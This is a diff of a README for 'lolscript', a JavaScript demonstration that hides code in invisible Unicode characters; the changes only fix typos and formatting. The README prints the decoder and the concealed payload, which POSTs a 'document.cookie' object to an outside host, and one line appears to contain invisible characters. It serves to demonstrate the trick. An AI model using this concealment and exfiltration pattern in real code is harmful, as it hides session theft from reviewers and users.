@@ -15,7 +15,7 @@ It does󠅮󠄧󠅴.
 
 --------
 
-In its current obsfucation, the `lolscript` (lol.js) will only run on Little Endian machines.
+In its current obfuscation, the `lolscript` (lol.js) will only run on Little Endian machines.
 
 To run it on Big Endian machines, change the Chinese(?) characters on lines 5 and 6 to `"畮"` and `"敳捡灥"` respectively.
 
@@ -47,7 +47,7 @@ var decoder = function (msg) {
   return unescape(escape(msg).replace(/uDB40%uDD/g,[]));
 };
 ```
-and this is the payload in lolscript:
+and this is the payload in `lolscript`:
 ```js
 "l" + encoder("o", `var xhr = new XMLHttpRequest(); xhr.open("POST", "https://bitovi.com/", true); xhr.send(JSON.stringify({ "document.cookie": "this easily could have been your session information. <3" }));`) + "l"
 ```
